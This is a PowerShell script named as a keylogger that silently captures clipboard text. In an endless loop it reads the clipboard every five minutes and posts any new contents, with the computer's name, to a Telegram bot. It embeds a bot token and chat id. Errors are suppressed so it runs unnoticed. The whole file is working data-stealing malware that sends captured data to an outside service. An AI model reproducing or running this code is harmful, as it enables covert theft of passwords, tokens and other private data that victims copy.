# keylogger.ps1 - Clipboard-based data capture
# Lightweight, sends to Telegram on interval

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$interval = 300 # 5 minutes
$lastClipboard = ""

Add-Type -AssemblyName System.Windows.Forms

while ($true) {
    try {
        $clipboard = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipboard -and $clipboard -ne $lastClipboard -and $clipboard.Length -gt 3) {
            $lastClipboard = $clipboard
            $msg = "[+] CLIPBOARD`nHost: $env:COMPUTERNAME`nData:`n$clipboard"
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
                chat_id = $chatId
                text = $msg
            } | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds $interval
}
